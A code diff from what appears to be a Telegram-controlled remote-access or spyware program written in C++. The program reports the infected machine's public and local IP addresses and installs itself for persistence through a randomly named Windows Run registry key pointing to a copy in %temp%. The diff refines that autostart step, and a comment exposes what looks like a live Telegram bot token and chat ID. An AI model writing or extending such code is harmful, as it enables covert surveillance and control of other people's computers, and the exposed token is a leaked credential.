@@ -28,7 +28,7 @@ using namespace cv;
 string ID;
 const string BOT_API = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
 const string CHAT_ID = "-1001655582641";
-const string VERSION = "beta v0.2.7";
+const string VERSION = "beta v0.2.8";
 constexpr int TELEGRAM_MAX = 4096;
 
 
@@ -372,7 +372,7 @@ string getStatus() {
     status += "public_ip: " + public_ip() +'\n';
     status += "local_ip: \n";
 
-    ListIpAddresses();
+    LocalIp.clear();  ListIpAddresses();
     for (auto i : LocalIp) {
         status += "  " + i.first + ": " + i.second + "\n";
     }
@@ -418,8 +418,14 @@ void autostart() {
             << "start %temp%\\" + get_exe() <<endl
             << "exit";
         file.close();
-        string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
-        system(cmd.c_str());
+
+        //if there's already no key for autosrat then it adds one
+        string s = "reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f " + get_exe();
+        if (exec(s.c_str()).find("End of search: 0 match(es) found.") != string::npos) {
+            cout << "Adding new key for autostart\n";
+            string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + random_string(16) + " /t REG_SZ /d %temp%\\" + get_exe();
+            system(cmd.c_str());
+        }
 
         char buffer[MAX_PATH];
         ::GetModuleFileNameA(NULL, buffer, MAX_PATH);
